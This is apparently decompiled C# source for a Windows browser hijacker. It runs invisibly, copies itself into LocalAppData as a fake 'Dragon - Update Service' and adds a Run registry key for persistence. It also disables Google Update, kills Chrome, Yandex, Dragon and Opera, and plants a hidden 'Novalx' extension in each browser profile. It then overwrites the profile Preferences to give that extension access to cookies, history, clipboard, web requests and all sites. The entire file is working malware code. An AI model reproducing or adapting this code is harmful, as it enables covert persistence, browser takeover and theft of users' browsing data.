using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using ns0;

namespace ns1;

internal sealed class Form1 : Form
{
	private static string string_0 = Environment.GetEnvironmentVariable("windir");

	private static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	private static string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string string_3 = string_1 + "\\Google\\Chrome\\User Data";

	private static string string_4 = string_1 + "\\Yandex\\YandexBrowser\\User Data";

	private static string string_5 = string_1 + "\\Chromium\\User Data";

	private static string string_6 = string_1 + "\\COMODO\\Dragon\\User Data";

	private static string string_7 = string_2 + "\\Opera Software\\Opera Stable";

	private static Class0 class0_0 = new Class0();

	private static string string_8 = class0_0.string_1[new Random().Next(0, class0_0.string_1.Length)];

	private static string string_9 = string_8.Split(new char[1] { '_' })[0];

	private static string string_10 = string_8.Split(new char[1] { '_' })[1];

	private static string string_11 = "bg.txt";

	private static string string_12 = "{\r\n   \"extensions\": {\r\n      \"settings\": {\r\n         \"" + string_9 + "\": {\r\n            \"active_permissions\": {\r\n               \"api\": [ \"unlimitedStorage\", \"notifications\", \"clipboardWrite\", \"notifications\", \"clipboardRead\", \"management\", \"tabs\", \"history\", \"cookies\", \"idle\", \"storage\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\", \"webRequestInternal\", \"contentSettings\" ],\r\n               \"explicit_host\": [ \"*://*/*\" ],\r\n               \"scriptable_host\": [ \"http://*/*\" ]\r\n            },\r\n            \"creation_flags\": 1,\r\n            \"from_bookmark\": false,\r\n            \"from_webstore\": false,\r\n            \"granted_permissions\": {\r\n               \"api\": [ \"unlimitedStorage\", \"notifications\", \"clipboardWrite\", \"notifications\", \"clipboardRead\", \"management\", \"tabs\", \"history\", \"cookies\", \"idle\", \"storage\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\", \"webRequestInternal\", \"contentSettings\" ],\r\n               \"explicit_host\": [ \"*://*/*\" ],\r\n               \"scriptable_host\": [ \"http://*/*\" ]\r\n            },\r\n            \"location\": 1,\r\n            \"manifest\": {\r\n               \"background\": {\r\n                  \"scripts\": [ \"" + string_11 + "\" ]\r\n               },\r\n               \"description\": \"\",\r\n               \"key\": \"" + string_10 + "\",\r\n               \"manifest_version\": 2,\r\n               \"name\": \"Novalx\",\r\n               \"permissions\": [ \"unlimitedStorage\", \"notifications\", \"clipboardWrite\", \"notifications\", \"clipboardRead\", \"management\", \"tabs\", \"history\", \"cookies\", \"idle\", \"storage\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\", \"webRequestInternal\", \"contentSettings\", \"*://*/*\" ],\r\n               \"version\": \"32.8\"\r\n            },\r\n            \"newAllowFileAccess\": true,\r\n            \"path\": \"" + string_9 + "\",\r\n            \"state\": 1,\r\n            \"was_installed_by_default\": false\r\n         }\r\n      }\r\n   }\r\n}";

	private IContainer icontainer_0 = null;

	public Form1()
	{
		InitializeComponent();
	}

	private unsafe void Form1_Load(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[8];
		if (!File.Exists(string_1 + "\\dragon-update.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), string_1 + "\\dragon-update.exe", overwrite: true);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Dragon - Update Service", string_1 + "\\dragon-update.exe");
		registryKey.Close();
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Google\\Update");
		registryKey2.SetValue("UpdateDefault", 0);
		registryKey2.Close();
		string[] array = new string[4] { "chrome", "browser", "dragon", "opera" };
		string[] array2 = array;
		*(int*)ptr = 0;
		while (*(int*)ptr < array2.Length)
		{
			string processName = array2[*(int*)ptr];
			Process[] processesByName = Process.GetProcessesByName(processName);
			Process[] array3 = processesByName;
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array3.Length)
			{
				Process process = array3[*(int*)((byte*)ptr + 4)];
				process.Kill();
				(*(int*)((byte*)ptr + 4))++;
			}
			(*(int*)ptr)++;
		}
		if (Directory.Exists(string_3))
		{
			array2 = Directory.GetDirectories(string_3 + "\\");
			*(int*)ptr = 0;
			while (*(int*)ptr < array2.Length)
			{
				string text = array2[*(int*)ptr];
				if (!(text == string_3 + "\\PepperFlash") && !(text == string_3 + "\\SwiftShader") && !(text == string_3 + "\\WidevineCDM") && !(text == string_3 + "\\pnacl"))
				{
					method_0(text);
				}
				(*(int*)ptr)++;
			}
		}
		if (Directory.Exists(string_4))
		{
			array2 = Directory.GetDirectories(string_4);
			*(int*)ptr = 0;
			while (*(int*)ptr < array2.Length)
			{
				string text = array2[*(int*)ptr];
				if (!(text == string_4 + "\\configs") && !(text == string_4 + "\\Crash Reports") && !(text == string_4 + "\\pnacl") && !(text == string_4 + "\\Resources"))
				{
					method_0(text);
				}
				(*(int*)ptr)++;
			}
		}
		if (Directory.Exists(string_5))
		{
			array2 = Directory.GetDirectories(string_5);
			*(int*)ptr = 0;
			while (*(int*)ptr < array2.Length)
			{
				string text = array2[*(int*)ptr];
				if (!(text == string_5 + "pnacl"))
				{
					method_0(text);
				}
				(*(int*)ptr)++;
			}
		}
		if (Directory.Exists(string_6))
		{
			array2 = Directory.GetDirectories(string_6);
			*(int*)ptr = 0;
			while (*(int*)ptr < array2.Length)
			{
				string text = array2[*(int*)ptr];
				method_0(text);
				(*(int*)ptr)++;
			}
		}
		if (Directory.Exists(string_7))
		{
			method_0(string_7);
		}
		Application.Exit();
	}

	private void method_0(string string_13)
	{
		if (!Directory.Exists(string_13 + "\\Extensions"))
		{
			try
			{
				Directory.CreateDirectory(string_13 + "\\Extensions");
			}
			catch (Exception)
			{
			}
		}
		try
		{
			Directory.CreateDirectory(string_13 + "\\Extensions\\" + string_9);
		}
		catch (Exception)
		{
		}
		try
		{
			TextWriter textWriter = new StreamWriter(string_13 + "\\Extensions\\" + string_9 + "\\" + string_11);
			textWriter.WriteLine(class0_0.string_0);
			textWriter.Close();
		}
		catch (Exception)
		{
		}
		try
		{
			TextWriter textWriter2 = new StreamWriter(string_13 + "\\Extensions\\" + string_9 + "\\jquery.txt");
			textWriter2.WriteLine(class0_0.string_2);
			textWriter2.Close();
		}
		catch (Exception)
		{
		}
		try
		{
			TextWriter textWriter3 = new StreamWriter(string_13 + "\\Preferences");
			textWriter3.WriteLine(string_12);
			textWriter3.Close();
		}
		catch (Exception)
		{
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
